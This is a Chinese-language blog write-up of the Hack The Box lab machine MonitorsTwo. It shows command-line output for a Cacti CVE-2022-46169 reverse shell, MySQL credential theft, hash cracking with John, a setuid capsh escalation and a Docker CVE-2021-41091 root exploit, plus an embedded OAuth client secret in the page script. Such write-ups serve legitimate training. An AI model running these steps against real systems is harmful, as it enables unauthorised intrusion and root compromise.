<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>MonitorsTwo - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - MonitorsTwo靶场信息                                                                                                            靶场难度">
<meta property="og:type" content="article">
<meta property="og:title" content="MonitorsTwo - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - MonitorsTwo靶场信息                                                                                                            靶场难度">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/i7buleFIoWpTCOSd5rZGbdlBp5jky3diopVTlFUmg_s.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/WkIqj62gi9do_ov2iu2d1pk4ip3nteUupy7AK53AXN0.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/dl47lRfOTAiRq0PdOJjXsfiV8ErIJA9AoBK1hlDjQLc.png">
<meta property="og:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/uroHAWRGpe33d4Fj1Es_bmeQD-lepABDdzlau3RdbyY.png">
<meta property="article:published_time" content="2023-05-07T11:38:36.000Z">
<meta property="article:modified_time" content="2023-05-20T02:04:17.253Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/i7buleFIoWpTCOSd5rZGbdlBp5jky3diopVTlFUmg_s.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">MonitorsTwo - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">MonitorsTwo - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2023-05-07T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2023-05-07
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-MonitorsTwo"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox - MonitorsTwo</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场难度"><span class="post-toc-number">3.</span> <span class="post-toc-text">靶场难度</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-number">4.</span> <span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">6.</span> <span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#User"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">User</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#John"><span class="post-toc-number">6.1.1.</span> <span class="post-toc-text">John</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">Root</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-1"><span class="post-toc-number">6.2.1.</span> <span class="post-toc-text">Step 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-2"><span class="post-toc-number">6.2.2.</span> <span class="post-toc-text">Step 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Step-3"><span class="post-toc-number">6.2.3.</span> <span class="post-toc-text">Step 3</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox - MonitorsTwo"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">MonitorsTwo - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2023-05-07 19:38:36" datetime="2023-05-07T11:38:36.000Z"  itemprop="datePublished">2023-05-07</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-MonitorsTwo"><a href="#Hackthebox-MonitorsTwo" class="headerlink" title="Hackthebox - MonitorsTwo"></a>Hackthebox - MonitorsTwo</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2023/05/07/Hackthebox%20-%20MonitorsTwo/i7buleFIoWpTCOSd5rZGbdlBp5jky3diopVTlFUmg_s.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="靶场难度"><a href="#靶场难度" class="headerlink" title="靶场难度"></a>靶场难度</h1><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2023/05/07/Hackthebox%20-%20MonitorsTwo/WkIqj62gi9do_ov2iu2d1pk4ip3nteUupy7AK53AXN0.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.211
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 07:05 CST
Nmap scan report for 10.10.11.211
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/8%OT=22%CT=1%CU=41839%PV=Y%DS=2%DC=T%G=Y%TM=64582EE3
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11
OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   149.95 ms 10.10.16.1
2   193.70 ms 10.10.11.211

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2023/05/07/Hackthebox%20-%20MonitorsTwo/dl47lRfOTAiRq0PdOJjXsfiV8ErIJA9AoBK1hlDjQLc.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>通过 http 页面得至该 cms 为 <code>Cacti 1.2.22</code> ，去搜索一下看看有没有漏洞</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2023/05/07/Hackthebox%20-%20MonitorsTwo/uroHAWRGpe33d4Fj1Es_bmeQD-lepABDdzlau3RdbyY.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>找到一个 <code>CVE-2022-46169</code> ，下载下来使用</p>
<blockquote>
<p><a href="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22" target="_blank" rel="noopener">https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22</a></p>
</blockquote>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>使用 nc 开启一个端口监听</p>
<pre><code class="bash">nc -nvlp 4444
</code></pre>
<p>然后执行 exp</p>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop/CVE-2022-46169-CACTI-1.2.22]
└─# python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.16.23 --LPORT=4444
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
</code></pre>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.23] from (UNKNOWN) [10.10.11.211] 38920
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami&amp;&amp;id
whoami&amp;&amp;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>成功得到一个 shell</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="User"><a href="#User" class="headerlink" title="User"></a>User</h2><pre><code class="bash">bash-5.1$ cd /
cd /
bash-5.1$ ls -la
ls -la
total 88
drwxr-xr-x   1 root root 4096 Mar 21 10:49 .
drwxr-xr-x   1 root root 4096 Mar 21 10:49 ..
-rwxr-xr-x   1 root root    0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root  340 May  7 22:45 dev
-rw-r--r--   1 root root  648 Jan  5 11:37 entrypoint.sh
drwxr-xr-x   1 root root 4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root 4096 Mar 22 13:21 home
drwxr-xr-x   1 root root 4096 Nov 15 04:13 lib
drwxr-xr-x   2 root root 4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root 4096 Mar 22 13:21 media
drwxr-xr-x   2 root root 4096 Mar 22 13:21 mnt
drwxr-xr-x   2 root root 4096 Mar 22 13:21 opt
dr-xr-xr-x 274 root root    0 May  7 22:45 proc
drwx------   1 root root 4096 Mar 21 10:50 root
drwxr-xr-x   1 root root 4096 Nov 15 04:17 run
drwxr-xr-x   1 root root 4096 Jan  9 09:30 sbin
drwxr-xr-x   2 root root 4096 Mar 22 13:21 srv
dr-xr-xr-x  13 root root    0 May  7 22:45 sys
drwxrwxrwt   1 root root 4096 May  7 23:08 tmp
drwxr-xr-x   1 root root 4096 Nov 14 00:00 usr
drwxr-xr-x   1 root root 4096 Nov 15 04:13 var
</code></pre>
<p>首先前往根目录，看到一个脚本 <code>entrypoint.sh</code> ，并且看到一个 <code>.dockerenv</code> ，怀疑我们当前环境在 docker 容器里</p>
<p>查看一下脚本的内容</p>
<pre><code class="bash">bash-5.1$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo &quot;database is connected&quot;
if [[ ! $(mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;) =~ &quot;automation_devices&quot; ]]; then
    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e &quot;UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;&quot;
    mysql --host=db --user=root --password=root cacti -e &quot;SET GLOBAL time_zone = &#39;UTC&#39;&quot;
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ &quot;${1#-}&quot; != &quot;$1&quot; ]; then
        set -- apache2-foreground &quot;$@&quot;
fi

exec &quot;$@&quot;
</code></pre>
<p>这里可以看到 mysql 的链接地址和登录凭据</p>
<p>构造一下 mysql 语句</p>
<pre><code class="bash">mysql --host=db --user=root --password=root cacti -e &quot;show tables&quot;
mysql --host=db --user=root --password=root cacti -e &quot;select * from user_auth&quot;

admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
</code></pre>
<p>得到了两个 hash 值</p>
<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>使用 John 进行爆破</p>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
marcus:funkymonkey

1 password hash cracked, 0 left
</code></pre>
<p>爆破出来了一个账号密码，使用 ssh 进行登录</p>
<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
└─# ssh marcus@10.10.11.211
marcus@10.10.11.211&#39;s password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 07 May 2023 11:50:19 PM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     12%
  Swap usage:                       0%
  Processes:                        227
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:74e1


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ whoami&amp;&amp;id
marcus
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
</code></pre>
<pre><code class="bash">marcus@monitorstwo:~$ ls
user.txt
marcus@monitorstwo:~$ cat user.txt 
2df2af6924e2b749d747ce39010753e5
</code></pre>
<p>成功拿到 user 权限的 flag 文件</p>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>在登录 Marcus 的时候，提示我们有一封邮件，去查看一下</p>
<pre><code class="bash">marcus@monitorstwo:~$ cat /var/mail/marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
</code></pre>
<p>这里提到了三个 CVE 漏洞，按照情况分析，应该是第三个 CVE-2021-41091</p>
<blockquote>
<p><a href="https://github.com/UncleJ4ck/CVE-2021-41091" target="_blank" rel="noopener">https://github.com/UncleJ4ck/CVE-2021-41091</a></p>
</blockquote>
<p>该漏洞利用有三个步骤</p>
<ol>
<li>在 docker 容器中获得 root 权限</li>
<li>在 docker 容器中使用 <code>chmod u+s /bin/bash</code> 设置 <code>/bin/bash</code> 的权限</li>
<li>执行 poc</li>
</ol>
<p>现在来进行利用</p>
<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><pre><code class="bash">www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
</code></pre>
<p>查找可以执行的文件</p>
<p>发现一个可疑的 <code>/sbin/capsh</code> </p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/capsh/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/capsh/</a></p>
</blockquote>
<p>找到了关于 capsh 的提权提示</p>
<pre><code class="bash">www-data@50bca5e748b0:/var/www/html$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
whoami&amp;&amp;id
root
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</code></pre>
<p>成功提权到 root</p>
<h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><pre><code class="bash">chmod u+s /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
</code></pre>
<p>给 <code>/bin/bash</code> 添加上 s 权限</p>
<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><pre><code class="bash">marcus@monitorstwo:~$ ./exp.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[&gt;] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in &#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged&#39;

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn&#39;t spawn a shell go to this path and execute &#39;./bin/bash -p&#39;

[!] Spawning Shell
bash-5.1# exit
</code></pre>
<p>执行 exp，成功获取到了容器所在的地址</p>
<pre><code class="bash">marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# whoami&amp;&amp;id
root
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
</code></pre>
<p>成功提权到 root</p>
<pre><code class="bash">bash-5.1# cat /root/root.txt 
45e2b87e322ce4ea1ae7f141fd210579
</code></pre>
<p>成功拿到 root 权限的 flag 文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/&title=《MonitorsTwo - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/&title=《MonitorsTwo - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MonitorsTwo - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2023/05/19/Hackthebox%20-%20CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">CrossFitTwo - Hackthebox - 还没做完</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2023/05/07/Hackthebox%20-%20Photobomb/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Photobomb - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/&title=《MonitorsTwo - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/&title=《MonitorsTwo - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
